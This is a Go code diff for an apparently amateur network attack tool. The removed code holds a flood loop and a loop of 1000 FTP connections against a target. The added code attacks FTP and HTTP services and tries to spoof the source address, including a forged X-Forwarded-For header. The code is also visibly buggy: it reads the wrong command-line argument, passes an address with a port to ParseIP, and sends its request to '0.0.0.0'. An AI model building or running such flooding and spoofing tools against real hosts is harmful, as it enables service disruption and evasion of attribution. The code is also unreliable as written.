@@ -7,44 +7,43 @@ import (
 	"net"
 	"net/http"
 	"net/url"
+	"os"
+
+	// "os"
 	"strings"
 	"time"
 
 	"github.com/google/gopacket"
-	"github.com/google/gopacket/layers"
-	ftp "github.com/jlaffaye/ftp"
+	"github.com/google/gopacket/pcap"
+	"github.com/jlaffaye/ftp"
 )
 
-func floodPort(targetfunction func(string), tarIP string) {
-	for i := 0; i < 1000; i++ {
-		go targetfunction(tarIP)
-		go targetfunction(tarIP)
-		go targetfunction(tarIP)
-		targetfunction(tarIP)
-		fmt.Println("Executed ", i, " Proccess")
-	}
-}
+var (
+	device            = "en0"
+	snapshotLen int32 = 1024
+	err         error
+	timeout     = 30 * time.Second
+	handle      *pcap.Handle
+	buffer      gopacket.SerializeBuffer
+	options     gopacket.SerializeOptions
+)
 
-func spamFTP(nrThread int, targetIP string) {
-	for i := 0; i < 1000; i++ {
-		c, err := ftp.Dial(targetIP, ftp.DialWithTimeout(5*time.Second))
+func attackFTP(targetIP string, LoginStall bool) {
+	c, err := ftp.Dial(targetIP, ftp.DialWithTimeout(5*time.Second))
+	if err != nil {
+		log.Fatal(err)
+	}
+	// If logging in is relevant, edit LoginStall to true.
+	if LoginStall {
+
+		err = c.Login("login", "password")
 		if err != nil {
 			log.Fatal(err)
 		}
-		//err = c.Login("login", "password")
-		//if err != nil {
-		//		log.Fatal(err)
-		//	}
-		// Do something with the FTP conn
-
-		//if err := c.Quit(); err != nil {
-		//	log.Fatal(err)
-		//}
-		if c != c {
-			fmt.Println(c)
+		
+		if err := c.Quit(); err != nil {
+			log.Fatal(err)
 		}
-
-		fmt.Println("login attempt ", i, " From thread nr ", nrThread)
 	}
 }
 
@@ -55,9 +54,7 @@ func attackHTTP(httpReq string) {
 	// Create request body
 	reqBody := ioutil.NopCloser(strings.NewReader(`
 					{
-							"name":"test",
-							"salary","123",
-							"age","23"
+						"test":"test me"
 					}
 	`))
 
@@ -73,7 +70,7 @@ func attackHTTP(httpReq string) {
 	// Send an HTTP request using `req` object
 	res, err := http.DefaultClient.Do(req)
 
-	// Chec for response error
+	// Check for response error
 	if err != nil {
 		log.Fatal("Error:", err)
 	}
@@ -82,7 +79,10 @@ func attackHTTP(httpReq string) {
 	data, _ := ioutil.ReadAll(res.Body)
 
 	// Close response body
-	res.Body.Close()
+	err = res.Body.Close()
+	if err != nil {
+		return
+	}
 
 	// Print response status and body
 	fmt.Printf("status: %d\n", res.StatusCode)
@@ -90,27 +90,49 @@ func attackHTTP(httpReq string) {
 
 }
 
-func main() {
-	fmt.Println("Initiating...")
-	//const ipTarget = "http://192.168.0.107"
-	//floodPort(attackHTTP, ipTarget)
+func selectPort(ipTarget string, portTarget string) {
 
-	ip := &layers.IPv4{
-		SrcIP: net.IP{1, 2, 3, 4},
-		DstIP: net.IP{5, 6, 7, 8},
+	switch portTarget {
+	case "ftp":
+		attackFTP(ipTarget, false)
+	case "http":
+		attackHTTP(ipTarget)
 	}
-	buf := gopacket.NewSerializeBuffer()
-	opts := gopacket.SerializeOptions{}
-	err := ip.SerializeTo(buf, opts)
+
+}
+
+func spoofIP() {
+
+	myip := net.ParseIP("150.0.0.1:8000")
+	addrspoot := &net.IPAddr{myip, ""}
+
+	TransportExp := &http.Transport{
+		DialContext: (&net.Dialer{
+			LocalAddr: addrspoot,
+		}).DialContext,
+	}
+	client := &http.Client{
+		Transport: TransportExp,
+	}
+	//	targetIP2 := net.ParseIP("128.0.0.1")
+	//	client, err := ioutil.ReadAll(client)
+
+	req, err := http.NewRequest("GET", "0.0.0.0", nil)
 	if err != nil {
-		panic(err)
+		return 
 	}
-	fmt.Println(buf.Bytes())
-	gopacket.SerializableLayer(buf, opts,
-		&layers.Ethernet{},
-		&layers.IPv4{},
-		&layers.TCP{},
-		gopacket.Payload([]byte{1, 2, 3, 4}))
-	packetData := buf.Bytes()
+	req.Header.Add("X-Forwarded-For", "1.2.3.4")
+	resp, err := client.Do(req)
+	// TransportExp = buffer.Bytes()
 
+	fmt.Println(resp.Body)
+}
+
+
+func main() {
+
+	var targetIP = os.Args[0]
+	var targetPort = os.Args[1]
+	selectPort(targetIP, targetPort)
+	
 }
